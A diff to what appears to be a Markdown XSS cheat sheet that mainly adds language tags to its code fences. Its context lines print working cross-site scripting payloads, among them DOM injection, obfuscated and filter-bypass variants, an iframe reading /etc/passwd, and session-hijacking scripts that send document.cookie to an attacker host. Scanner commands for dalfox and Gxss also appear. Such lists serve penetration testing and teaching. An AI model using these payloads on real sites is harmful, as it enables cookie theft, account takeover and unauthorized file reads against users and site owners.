@@ -301,8 +301,7 @@ Below are some examples of DOM-based XSS, where malicious code is dynamically ma
 ```
 
 #### Injection via setAttribute
-
-```
+```js
 <script>
   var user = location.search.split("=")[1];
   document.getElementById("link").setAttribute("href", user);
@@ -310,7 +309,7 @@ Below are some examples of DOM-based XSS, where malicious code is dynamically ma
 ```
 
 -> Payload
-```
+```js
 ?user=javascript:alert(1)
 ```
 
@@ -367,12 +366,12 @@ https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
 ```
 
 -> setInterval + hexadecimal  
-```
+```html
 <img src=x onerror="setInterval('\x61lert(1)')"/>
 ```
 
 -> setTimeout + hex + octal  
-```
+```html
 <img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
 ```
 
@@ -402,12 +401,12 @@ https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
 ```
 
 -> setInterval + hexadecimal  
-```
+```html
 <img src=x onerror="setInterval('\x61lert(1)')"/>
 ```
 
 -> setTimeout + hex + octal  
-```
+```html
 <img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
 ```
 
@@ -420,7 +419,7 @@ https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
 Sometimes you can find a filter being applied as sanitization to mitigate Cross-Site Scripting (XSS), in this case there are ways to bypass this protection:  
 -> Filter blocking "on" - Bypass  
 `(on\w+\s*=)`  
-```
+```html
 <svg onload%09=alert(1)> 
 <svg %09onload%20=alert(1)>
 <svg onload%09%20%28%2C%3B=alert(1)>
@@ -429,7 +428,7 @@ Sometimes you can find a filter being applied as sanitization to mitigate Cross-
 
 ### Keyword Based in Filter
 #### "alert" blocked - Bypass
-```
+```js
 <script>\u0061lert(1)</script>
 <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
 <script>eval("\u0061lert(1)")</script>  
@@ -437,30 +436,30 @@ Sometimes you can find a filter being applied as sanitization to mitigate Cross-
 ```
 
 #### Removing "script" Tag - Bypass
-```
+```js
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
 ```
 
 ### Scaping Quote - Bypass
 #### Methods
 -> String.fromCharCode()
-```
+```js
 eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))
 ```
 -> unescape  
-```
+```js
 eval(unescape("%61%6c%65%72%74%28%27%58%53%53%27%29"))
 ```
 
 -> decodeURI
-```
+```js
 eval(decodeURI(/alert(%22xss%22)/.source))
 eval(decodeURIComponent(/alert(%22xss%22)/.source))
 ```  
  
 ### Other bypass techniques
 -> unicode  
-```
+```html
 <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
 ```
 
@@ -484,14 +483,17 @@ https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html
 https://malwaredecoder.com/  
 
 ### XSS to LFI
-```
+```html
 <img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+```
+
+```js
 <script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
 ```
-	
+
 ### XSS - Session Hijacking
 -> Examples
-```
+```js
 <script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
 <script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
 <script>window.location="http://<IP>/?cookie="+document.cookie;</script>
@@ -501,13 +503,13 @@ https://malwaredecoder.com/
 
 ### XSS Tools
 -> dalfox  
-```
+```bash
 dalfox url http://example.com
 ```
 https://github.com/hahwul/dalfox
 
 -> gxss  
-```
+```bash
 echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
 ```
 https://github.com/KathanP19/Gxss
